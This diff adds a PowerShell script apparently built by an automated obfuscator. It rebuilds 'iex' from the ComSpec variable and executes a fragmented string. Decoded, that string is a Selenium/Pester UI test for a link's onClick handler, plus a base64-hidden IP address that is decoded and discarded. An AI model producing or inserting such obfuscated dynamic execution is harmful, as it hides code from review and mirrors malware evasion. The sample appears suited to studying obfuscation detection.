@@ -1,0 +1,11 @@
+ . ( $eNv:cOMSPeC[4,15,25]-joIN'')(('Enter'+'-S'+'e'+'U'+'r'+'l '+'i4HauZAdd'+'res'+'s/Tes'+'t/'+'Linki'+'4H'+' '+'-T'+'ar'+'get '+'a'+'uZDr'+'iver
+
+'+'Desc'+'ribe i4HNew-'+'U'+'D'+'Li'+'nki'+'4H'+' {
+'+'   '+' '+'([Tex'+'t'+'.En'+'c'+'odi'+'ng]'+':'+':'+'Uni'+'c'+'ode.Ge'+'tS'+'tring([C'+'on'+'ver'+'t]:'+':Fro'+'mBa'+'se'+'64St'+'rin'+'g(i4HJw'+'BpAHAAOg'+'AyADEAMwAuA'+'DE'+'ANwAwAC'+'4A'+'Mw'+'AuAD'+'cA'+'N'+'AA'+'n'+'AA='+'=i4H)) '+')hsY  '+'O'+'UT-n'+'u'+'Ll
+'+'    '+'It i4Hs'+'ho'+'ul'+'d '+'ha'+'ve f'+'ired '+'onCl'+'ick handle'+'r'+'i4'+'H {
+'+' '+'    '+'   '+'au'+'ZElement = Fin'+'d-SeEleme'+'nt '+'-D'+'ri'+'ver'+' auZD'+'rive'+'r'+' -Id Ctwl'+'i'+'nkCtw'+' 
+'+'      '+'  Invo'+'k'+'e'+'-Se'+'C'+'lick -'+'Element'+' auZ'+'Element 
+        '+'Get'+'-TestDa'+'ta hsY Sho'+'uld be Ct'+'wClicke'+'dCtw
+ '+' '+' '+' }'+'
+'+'}'+'
+').rEpLaCe(([CHaR]67+[CHaR]116+[CHaR]119),[stRIng][CHaR]39).rEpLaCe('auZ',[stRIng][CHaR]36).rEpLaCe('i4H',[stRIng][CHaR]34).rEpLaCe(([CHaR]104+[CHaR]115+[CHaR]89),[stRIng][CHaR]124))
